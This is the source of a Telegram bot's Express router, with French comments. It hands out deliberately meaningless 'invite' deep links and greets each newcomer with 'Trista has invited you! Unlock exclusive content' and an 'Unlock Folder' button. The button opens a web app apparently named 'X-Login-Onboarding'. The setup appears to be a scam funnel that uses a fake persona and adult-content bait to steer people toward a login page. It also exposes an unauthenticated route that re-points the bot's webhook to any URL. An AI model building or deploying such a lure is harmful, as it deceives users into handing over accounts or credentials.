// src/routes/bot.ts
import { Router } from "express";
import axios from "axios";

const router = Router();

const BOT_TOKEN = process.env.TG_BOT_TOKEN;
// Pour les boutons web_app, on doit utiliser l'URL HTTPS réelle de la web app
// L'URL t.me/cryptonsfwfoldesrbot/app est juste un raccourci Telegram vers cette URL
const MINI_APP_URL = process.env.MINI_APP_URL || "https://websykylianprivate.github.io/X-Login-Onboarding/";
const BOT_USERNAME = process.env.BOT_USERNAME; // Nom d'utilisateur du bot (sans @)

if (!BOT_TOKEN) {
  console.warn("⚠️ TG_BOT_TOKEN non défini - le bot Telegram ne fonctionnera pas");
}

// Fonction helper pour extraire la commande de base (sans @botname)
function extractCommand(text: string): { command: string; args: string[] } {
  // Enlever les espaces et extraire la première partie
  const trimmed = text.trim();
  const parts = trimmed.split(/\s+/);
  const firstPart = parts[0];

  // Extraire la commande (enlever @botname si présent)
  const command = firstPart.split("@")[0];

  // Extraire les arguments
  const args = parts.slice(1);

  return { command, args };
}

// Webhook pour recevoir les mises à jour du bot Telegram
router.post("/webhook", async (req, res) => {
  try {
    const update = req.body;

    // Log complet de l'update pour déboguer
    console.log("🔔 Webhook reçu:", JSON.stringify(update, null, 2));

    // Pas besoin de gérer chat_member car on utilise des deep links vers le bot

    // Gérer les messages texte
    if (update.message && update.message.text) {
      const message = update.message;
      const chatId = message.chat.id;
      const text = message.text.trim();
      const userId = message.from.id;

      // Log pour déboguer
      console.log(`📨 Message reçu: "${text}" (chatId: ${chatId}, userId: ${userId})`);

      // Extraire la commande (gère aussi les commandes avec @botname)
      const { command, args } = extractCommand(text);
      console.log(`🔍 Commande extraite: "${command}", args:`, args);

      // Gérer la commande /invite - créer un lien d'invitation
      if (command === "/invite") {
        console.log(`✅ Commande /invite détectée`);
        const response = await handleInviteCommand(chatId, userId);
        return res.status(200).json({ ok: true, sent: response });
      }

      // Gérer la commande /start uniquement pour les liens d'invitation
      if (command === "/start") {
        console.log(`✅ Commande /start détectée avec args:`, args);
        // Extraire le paramètre du /start (ex: /start invite_123456 ou /start invite123456)
        const inviteCode = args.length > 0 ? args[0] : null;

        if (inviteCode && inviteCode.startsWith("invite")) {
          // Quelqu'un arrive via un lien d'invitation
          console.log(`🔗 Lien d'invitation détecté: ${inviteCode}`);
          const response = await handleInviteStart(chatId, userId, inviteCode);
          return res.status(200).json({ ok: true, sent: response });
        } else {
          // /start sans paramètre d'invitation - ne rien faire
          console.log(`⚠️ /start sans code d'invitation - ignoré`);
          return res.status(200).json({ ok: true });
        }
      }

      // Réponse par défaut pour les autres messages - ne rien faire
      console.log(`❓ Message non reconnu comme commande: "${text}"`);
      return res.status(200).json({ ok: true });
    } else {
      // Log si ce n'est pas un message texte
      console.log("⚠️ Update reçu mais ce n'est pas un message texte:", {
        hasMessage: !!update.message,
        messageType: update.message?.message_id ? "message" : "unknown",
        updateId: update.update_id,
      });
    }

    res.status(200).json({ ok: true });
  } catch (error: any) {
    console.error("❌ Erreur webhook bot:", error);
    res.status(200).json({ ok: true }); // Toujours répondre 200 à Telegram
  }
});

// Fonction pour envoyer le message /start avec un lien vers la mini app
async function sendStartMessage(chatId: number) {
  if (!BOT_TOKEN) {
    throw new Error("TG_BOT_TOKEN non défini");
  }

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  const response = await axios.post(url, {
    chat_id: chatId,
    text: `👋 Bienvenue !\n\n🚀 Cliquez sur le bouton ci-dessous pour ouvrir l'application :`,
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "🚀 Ouvrir l'application",
            web_app: {
              url: MINI_APP_URL,
            },
          },
        ],
      ],
    },
  });

  return response.data;
}

// Fonction pour créer un lien d'invitation vers le bot (deep link)
async function handleInviteCommand(chatId: number, userId: number) {
  if (!BOT_TOKEN) {
    throw new Error("TG_BOT_TOKEN non défini");
  }

  if (!BOT_USERNAME) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await axios.post(url, {
      chat_id: chatId,
      text: "❌ BOT_USERNAME non configuré. Veuillez configurer le nom d'utilisateur du bot dans les variables d'environnement.",
    });
    return response.data;
  }

  // Générer un code d'invitation (factice, tous les liens fonctionnent de la même manière)
  const inviteCode = `invite_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;

  // Créer le deep link vers le bot
  const inviteLink = `https://t.me/${BOT_USERNAME}?start=${inviteCode}`;

  try {
    // Envoyer le lien à l'utilisateur
    const sendUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await axios.post(sendUrl, {
      chat_id: chatId,
      text: `✨ *Lien d'invitation créé !*\n\n📤 Partagez ce lien avec vos amis.\n\nQuand quelqu'un clique dessus, il recevra un message spécial de Trista avec un bouton pour déverrouiller l'application.\n\n🔗 \`${inviteLink}\``,
      parse_mode: "Markdown",
      disable_web_page_preview: false,
    });

    return response.data;
  } catch (error: any) {
    console.error("❌ Erreur lors de la création du lien:", error);
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await axios.post(url, {
      chat_id: chatId,
      text: `❌ Erreur lors de la création du lien: ${error.message}`,
    });
    return response.data;
  }
}

// Fonction pour gérer quand quelqu'un arrive via un lien d'invitation
async function handleInviteStart(chatId: number, userId: number, inviteCode: string) {
  if (!BOT_TOKEN) {
    throw new Error("TG_BOT_TOKEN non défini");
  }

  try {
    // Tous les liens d'invitation fonctionnent de la même manière (pas de vérification Redis)
    // Envoyer le message "Trista vous a invité" avec le bouton déverrouiller
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await axios.post(url, {
      chat_id: chatId,
      text: "🔓 *Trista has invited you!*\n\nUnlock exclusive content to access the application.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Unlock Folder",
              web_app: {
                url: MINI_APP_URL,
              },
            },
          ],
        ],
      },
    });

    return response.data;
  } catch (error: any) {
    console.error("❌ Erreur lors du traitement de l'invitation:", error);
    // En cas d'erreur, ne rien envoyer
    throw error;
  }
}

// Route pour définir le webhook (à appeler une fois pour configurer le bot)
router.post("/set-webhook", async (req, res) => {
  try {
    if (!BOT_TOKEN) {
      return res.status(500).json({ error: "TG_BOT_TOKEN non défini" });
    }

    const webhookUrl = req.body.url || process.env.WEBHOOK_URL;

    if (!webhookUrl) {
      return res.status(400).json({ error: "URL du webhook requise" });
    }

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`;
    const response = await axios.post(url, {
      url: `${webhookUrl}/api/bot/webhook`,
      allowed_updates: ["message", "chat_member"], // Activer les mises à jour chat_member
    });

    res.json({ ok: true, result: response.data });
  } catch (error: any) {
    console.error("❌ Erreur setWebhook:", error);
    res.status(500).json({ error: error.message });
  }
});

// Route pour obtenir les infos du bot
router.get("/info", async (req, res) => {
  try {
    if (!BOT_TOKEN) {
      return res.status(500).json({ error: "TG_BOT_TOKEN non défini" });
    }

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
    const response = await axios.get(url);

    res.json({
      ok: true,
      bot: response.data.result,
      miniAppUrl: MINI_APP_URL,
      botUsername: BOT_USERNAME || "Non configuré",
    });
  } catch (error: any) {
    console.error("❌ Erreur getMe:", error);
    res.status(500).json({ error: error.message });
  }
});

// Route pour vérifier le statut du webhook
router.get("/webhook-info", async (req, res) => {
  try {
    if (!BOT_TOKEN) {
      return res.status(500).json({ error: "TG_BOT_TOKEN non défini" });
    }

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getWebhookInfo`;
    const response = await axios.get(url);

    res.json({
      ok: true,
      webhookInfo: response.data.result,
    });
  } catch (error: any) {
    console.error("❌ Erreur getWebhookInfo:", error);
    res.status(500).json({ error: error.message });
  }
});

// Route pour générer un lien d'invitation vers le bot (API alternative)
router.post("/create-invite", async (req, res) => {
  try {
    if (!BOT_TOKEN) {
      return res.status(500).json({ error: "TG_BOT_TOKEN non défini" });
    }

    if (!BOT_USERNAME) {
      return res.status(400).json({ error: "BOT_USERNAME non configuré" });
    }

    // Générer un code d'invitation (factice, tous les liens fonctionnent de la même manière)
    const inviteCode = `invite_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
    const inviteLink = `https://t.me/${BOT_USERNAME}?start=${inviteCode}`;

    res.json({
      ok: true,
      inviteLink,
      inviteCode,
      miniAppUrl: MINI_APP_URL,
    });
  } catch (error: any) {
    console.error("❌ Erreur createInvite:", error);
    res.status(500).json({ error: error.message });
  }
});

export default router;

